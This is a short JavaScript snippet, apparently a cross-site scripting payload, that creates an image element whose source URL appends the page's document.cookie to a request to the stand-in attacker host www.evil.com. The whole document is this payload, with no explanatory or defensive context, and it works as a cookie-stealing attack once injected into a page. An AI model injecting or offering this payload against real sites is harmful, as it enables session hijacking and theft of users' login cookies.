var img = document.createElement("img");
img.src = "http://www.evil.com/log?cookie=" + escape(document.cookie);
document.body.appendChild(img);
